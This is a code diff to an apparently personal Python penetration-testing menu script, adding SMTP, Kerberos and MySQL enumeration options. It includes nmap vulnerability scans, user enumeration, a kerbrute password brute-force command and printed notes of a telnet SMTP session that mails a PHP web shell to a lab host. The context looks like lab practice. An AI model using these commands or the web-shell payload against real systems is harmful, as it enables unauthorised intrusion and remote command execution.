@@ -31,7 +31,7 @@ class Display_class:
 
 home_title	= "Home"
 home_comment= "#####"
-home_lst	= ["nmap()", "dns()", "web()", "webapp()", "smb()", "ldap()", "ProtoBrute()"]
+home_lst	= ["nmap()", "dns()", "smtp()","web()", "webapp()", "kerberos()", "smb()", "ldap()", "mysql()", "oracle()", "ProtoBrute()"]
 home 		= Display_class(home_title, home_comment, home_lst)
 
 yes		= [ "yes","y", "yee yee", "yee", "yeah", "yeet", "yeet cannon", "yea", "yeah", "ye"]
@@ -70,6 +70,54 @@ def nmap():
 		command = "echo 'sudo nmap -Pn -sS -p- {}'".format(ip)
 	elif scan 	== 7:
 		command = "echo sudo 'nmap -Pn -p- -sU {}'".format(ip)
+	doit(command)
+
+def smtp():
+	smtp_title	= "smtp"
+	smtp_comment= "#####"	
+	smtp_lst	= ["SmtpVulnNmap", "SmtpUserEnum", "SmtpManualEnumNotes"]
+	smtp 		= Display_class(smtp_title, smtp_comment, smtp_lst)
+	scan 		= Display(smtp)
+
+	if scan 	== 1:
+	#Smtp Vuln Nmap
+		command = "nmap --script=smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 {}".format(ip)
+	if scan 	== 2:
+		#Smtp User Enum
+		command = "smtp-user-enum -M VRFY -U /usr/share/wfuzz/wordlist/others/names.txt -t {}".format(ip)
+	if scan 	== 3:
+		print("""
+root@kali:~# telnet 10.10.10.7 25
+Trying 10.10.10.7...
+Connected to 10.10.10.7.
+Escape character is '^]'.
+220 beep.localdomain ESMTP Postfix
+EHLO coolhandsquid.au
+250-beep.localdomain
+250-PIPELINING
+250-SIZE 10240000
+250-VRFY
+250-ETRN
+250-ENHANCEDSTATUSCODES
+250-8BITMIME
+250 DSN
+VRFY asterisk@localhost  
+252 2.0.0 asterisk@localhost
+mail from:coolhandsquid@step-child.au
+250 2.1.0 Ok
+rcpt to:asterisk@localhost
+250 2.1.5 Ok
+data
+354 End data with <CR><LF>.<CR><LF>
+Subject: You got owned
+<?php echo system($_REQUEST['squid']); ?>
+
+.
+250 2.0.0 Ok: queued as 84C50D92F8
+^C
+^]
+telnet> quit
+""")
 	doit(command)
 
 def dns():
@@ -173,6 +221,23 @@ def webapp():
 		return
 	doit(command)
 
+def kerberos():
+	kerberos_title 		= "kerberos"
+	kerberos_comment 	= "#####"
+	kerberos_lst 		= ["Pre Creds", "With Users", "With Creds"]
+	kerberos 			= Display_class(kerberos_title, kerberos_comment, kerberos_lst)
+	scan 				= Display(kerberos)
+
+	dn = "yeet.local"
+	q1 = input("What is the domain name? Example: yeet.local")
+	if scan == 1:
+		#Pre Creds
+		command = "nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='{}',userdb=/usr/share/seclists/Usernames/Names/names.txt {}".format(dn, ip)
+	if scan == 2:
+		#With Users
+		command = "./kerbrute_linux_amd64 bruteuser --dc 10.11.1.220 -d thinc.local /Yeet/Tools/Wordlists/rockyou.txt kevin@thinc.local"
+
+
 def smb():
 	smb_title	= "smb"
 	smb_comment= "#####"
@@ -227,6 +292,17 @@ def ldap():
 		command = "ldapsearch -h {} -x -s base namingcontexts".format(ip)
 	elif scan 	== 4:
 		command = "ldapsearch -h {} -x -b '{}'".format(ip, nc)
+	doit(command)
+
+def mysql():
+	mysql_title 	= "mysql"
+	mysql_comment 	= "#####"
+	mysql_lst 		= ["mysqlVulnNmap"]
+	mysql 			= Display_class(mysql_title, mysql_comment, mysql_lst)
+	scan 			= Display(mysql)
+
+	if scan  == 1:
+		command = "nmap --script=mysql-databases.nse,mysql-empty-password.nse,mysql-enum.nse,mysql-info.nse,mysql-variables.nse,mysql-vuln-cve2012-2122.nse {} -p 3306".format(ip)
 	doit(command)
 
 def oracle():
@@ -461,7 +537,7 @@ def input_validation(objec):
 				return foo
 			else:
 				print(bad_input)
-				return
+				return False
 	except KeyboardInterrupt:
 		print("Later Tater")
 		quit()
